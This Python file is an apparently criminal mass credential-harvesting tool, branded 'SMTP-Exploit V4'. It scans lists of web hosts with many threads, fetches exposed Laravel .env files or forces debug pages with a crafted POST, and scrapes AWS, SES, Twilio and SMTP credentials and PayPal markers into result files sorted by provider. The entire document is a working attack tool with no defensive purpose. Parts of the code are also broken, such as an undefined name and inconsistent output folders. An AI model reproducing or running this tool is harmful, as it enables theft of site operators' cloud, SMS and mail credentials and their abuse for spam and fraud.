import requests, os, sys, platform, colorama
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from configparser import ConfigParser
from queue import Queue

colorama.init()

list_region = 'us-east-1\nus-east-2\nus-west-1\nus-west-2\naf-south-1\nap-east-1\nap-south-1\nap-northeast-1\nap-northeast-2\nap-northeast-3\nap-southeast-1\nap-southeast-2\nca-central-1\neu-central-1\neu-west-1\neu-west-2\neu-west-3\neu-south-1\neu-north-1\nme-south-1\nsa-east-1'

if platform == "win32":
    os.system('title Private SmtpEx V4 (Final Version) By : @killo_trojanz')
else:
    sys.stdout.write("\x1b]2;Private SmtpEx V4 (Final Version) By : @killo_trojanz\x07")

if platform == "win32":
    os.system("color")
elif platform == "nt":
    os.system("cls")
else:
    os.system("clear")

if not os.path.exists("Result"):
    os.mkdir("Result")

pid_restore = '.nero_swallowtail'

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))
    def wait_completion(self):
        self.tasks.join()
class androxgh0st:
    def paypal(self, text, url):
        if "PAYPAL" in text:
            save = open("Result"+os.sep+"Paypal-SandBox.txt", "a")
            save.write(url+"\n")
            save.close()
            return True
        else:
            return False
    def get_aws_region(self, text):
        reg = False
        for region in list_region.splitlines():
            if str(region) in text:
                return region
                break

    def get_aws_data(self,text,url):
        try:
            if 'AWS_ACCESS_KEY_ID' in text:
                if 'AWS_ACCESS_KEY_ID=' in text:
                    method = "/.env"
                    try:
                        aws_key = reg('\nAWS_ACCESS_KEY_ID=(.*?)\n', text)
                    except:
                        aws_key = ""
                    try:
                        aws_sec = reg('\nAWS_SECRET_ACCESS_KEY=(.*?)\n', text)
                    except:
                        aws_sec = ""
                    try:
                        asu = androxgh0st.get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ""
                    except:
                        aws_reg = ""
            elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
                method = 'debug'
                try:
                    aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_key = ''
                try:
                    aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_sec = ''
                try:
                    asu = androxgh0st().get_aws_region(text)
                    if asu:
                        aws_reg = asu
                    else:
                        aws_reg = ''
                except:
                    aws_reg = ''
                    if aws_reg == "":
                        aws_reg = "aws_unknown_region--"
                    if aws_key == "" and aws_sec == "":
                        return False
                    else:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+str(aws_reg)[:-2]+'.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                        remover = str(build).replace('\r', '')
                        save2 = open('Results'+os.sep+'aws_access_key_secret.txt', 'a')
                        save2.write(remover+'\n\n')
                        save2.close()
                        return True
            elif "AWS_KEY" in text:
                if "AWS_KEY=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
                    except:
                        aws_buc = ''
            elif "<td>AWS_KEY</td>" in text:
                method = 'debug'
                try:
                    aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_key = ''
                try:
                    aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_sec = ''
                try:
                    asu = androxgh0st().get_aws_region(text)
                    if asu:
                        aws_reg = asu
                    else:
                        aws_reg = ''
                except:
                    aws_reg = ''
                try:
                    aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_buc = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '+str(aws_buc)
                    remover = str(build).replace('\r', '')
                    save = open('Results'+os.sep+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results'+os.sep+'aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "SES_KEY" in text:
                if "SES_KEY=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
            elif "<td>SES_KEY</td>" in text:
                method = 'debug'
                try:
                    aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_key = ''
                try:
                    aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_sec = ''
                try:
                    asu = androxgh0st().get_aws_region(text)
                    if asu:
                        aws_reg = asu
                    else:
                        aws_reg = ''
                except:
                    aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                    if aws_key == "" and aws_sec == "":
                        return False
                    else:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+str(aws_reg)[:-2]+'.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                        remover = str(build).replace('\r', '')
                        save2 = open('Results'+os.sep+'aws_access_key_secret.txt', 'a')
                        save2.write(remover+'\n\n')
                        save2.close()
                        return True
            else:
                return False
        except:
            return False
    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                if "TWILIO_ACCOUNT_SID=" in text:
                    method = "/.env"
                    try:
                        acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n',text)
                    except:
                        acc_sid = ""
                    try:
                        acc_key = reg('\nTWILIO_API_KEY=(.*?)\n',text)
                    except:
                        acc_key = ""
                    try:
                        sec = reg('\nTWILIO_API_SECRET=(.*?)\n',text)
                    except:
                        sec = ""
                    try:
                        chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n',text)
                    except:
                        chatid = ""
                    try:
                        phone = reg('\nTWILIO_NUMBER=(.*?)\n',text)
                    except:
                        phone = ""
                    try:
                        auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n',text)
                    except:
                        auhtoken = ""
                elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
                    method = "debug"
                    try:
                        acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>',text)
                    except:
                        acc_sid = ""
                    try:
                        acc_key = reg('<td>TWILIO_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>',text)
                    except:
                        acc_key = ""
                    try:
                        sec = reg('<td>TWILIO_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>',text)
                    except:
                        sec = ""
                    try:
                        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)
                    except:
                        chatid = ""
                    try:
                        phone = reg('<td>TWILIO_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>',text)
                    except:
                        phone = ""
                    try:
                        auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>',text)
                    except:
                        auhtoken = ""
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
                remover = str(build).replace("\r","")
                save = open("Result"+os.sep+"Twillio.txt", "a")
                save.write(remover+"\n\n")
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_smtp(self,text,url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = "/.env"
                    try:
                        mailhost = reg('\nMAIL_HOST=(.*?)\n', text)
                    except:
                        mailhost = ""
                    try:
                        mailport = reg('\nMAIL_PORT=(.*?)\n', text)
                    except:
                        mailport = ""
                    try:
                        mailuser = reg('\nMAIL_USERNAME=(.*?)\n', text)
                    except:
                        mailuser = ""
                    try:
                        mailpass = reg('\nMAIL_PASSWORD=(.*?)\n', text)
                    except:
                        mailpass = ""
                    try:
                        mailfrom = reg('\nMAIL_FROM_ADDRESS=(.*?)\n', text)
                    except:
                        mailfrom = ""
                    try:
                        fromname = reg('\\MAIL_FROM_NAME=(.*?)\n', text)
                    except:
                        fromname = ""
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    return False
                else:
                    if ".amazonaws.com" in mailhost:
                        getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+getcountry[:-2]+'.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                        remover = str(build).replace('\r', '')
                        save2 = open('Results'+os.sep+'smtp_aws.txt', 'a')
                        save2.write(remover+'\n\n')
                        save2.close()
                    elif 'sendgrid' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)  +'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+'sendgrid.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'office365' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)  +'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+'office.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif '1and1' in mailhost or '1und1' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method) +'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)  +'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+'1and1.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'zoho' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)  +'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+'zoho.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mandrillapp' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)  +'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+'mandrill.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mailgun' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)  +'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+'mailgun.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    else:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)   +'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results'+os.sep+'SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    return True
        except:
            return False

def printf(text):
    text = ''.join([str(item) for item in text])
    print(text+"\n")

def main(url):
    print(url)
    resp = False
    try:
        text = '\x1b[42;1m[Connect To List]\x1b[0m  ' + url
        headers = {"User-Agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False)
        if "APP_KEY=" in get_source.text:
            resp = get_source.text
        else:
            get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
                if resp:
                    getsmtp = androxgh0st().get_smtp(resp, url)
                    getwtilio = androxgh0st().get_twillio(resp,url)
                    getaws = androxgh0st().get_aws_data(resp,url)
                    getpp = androxgh0st().paypal(resp,url)
                    if getsmtp:
                        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[46;1mSMTP\x1b[0m'
                    else:
                        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[45;1mSMTP\x1b[0m'
                    if getaws:
                        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[44;1mAWS\x1b[0m'
                    else:
                        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[43;1mAWS\x1b[0m'
                    if getwtilio:
                        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[42;1mTWILIO\x1b[0m'
                    else:
                        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[43;1mTWILIO\x1b[0m'
                    if getpp:
                        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[44;1mPAYPAL\x1b[0m'
                    else:
                        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[45;1mPAYPAL\x1b[0m'
                else:
                    text = ' \x1b[42;1m[Status]\x1b[0m \x1b[41;1mFail To Crack\x1b[0m'
                    save = open("Result"+os.sep+"fail-crack.txt", "a")
                    asu = url.replace("\r", "")
                    save.write(asu+"\n")
    except:
        text = '\x1b[42;1m[Connect To List]\x1b[0m  ' + url
        text += ' \x1b[42;1m[Status]\x1b[0m \x1b[41;1mBad List\x1b[0m'
        save = open("Result"+os.sep+"bad-list.txt", "a")
        asu = str(url).replace("\r","")
        save.write(asu+"\n")
        save.close()
    printf(text)



if __name__ == "__main__":
    print('\n\n                          \x1b[46;1m SMTP-Exploit V4 (Final Version)\x1b[0m\n\t\t  _________        __        ___________       \n\t\t /   _____/ ______/  |_______\\_   _____/__  ___\n\t\t \\_____  \\ /     \\   __\\____ \\|    __)_\\  \\/  /\n\t\t /        \\  Y Y  \\  | |  |_> >        \\>    < \n\t\t/_______  /__|_|  /__| |   __/_______  /__/\\_ \\\n\t\t        \\/      \\/     |__|          \\/      \\/\n                          \x1b[33mReversed By Scarletta\'s Lounge\x1b[0m\n\n\n\t [\x1b[36;1m+\x1b[0m]\x1b[36;1m SmtpAws-Exploit\x1b[0m\n\t [\x1b[36;1m+\x1b[0m]\x1b[36;1m RCE V9 (Perfect Verion) \x1b[0m\n\t [\x1b[36;1m+\x1b[0m]\x1b[36;1m 120 Top Exploit + Pages \x1b[0m\n\t [\x1b[36;1m+\x1b[0m]\x1b[36;1m Private 2022 SMTP-AWS Cracker \x1b[0m\t\n\n\t \n')
    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get("DB", "FILES")
        numthread = readcfg.get("DB", "THREAD")
        sessi = readcfg.get("DB", "SESSION")
        print("log session bot found! restore session")
        print("Using Configuration : \n\tFILES="+lists+"\n\tTHREAD="+numthread+"\n\tSESSION="+sessi)
        tanya = input(' Continue Exploit ? [y/n] ')
        if tanya.lower() == "y":
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl      
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except FileNotFoundError:
            print("List Not Found")
            exit()
        except Exception:
            lists = input('List IPs/Domain \x1b[36;1m--> \x1b[0m')
            try:
                readsplit = open(lists).read().splitlines()
            except:
                print("List Not Found")
                exit()
        try:
            numthread = input('Thread (Default : \x1b[36;1m200\x1b[0m) \x1b[36;1m--> \x1b[0m ')
        except Exception:
            print("Error Threads")
            exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, "w")
            cfgsession = '[DB]\nFILES='+lists+'\nTHREAD='+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass
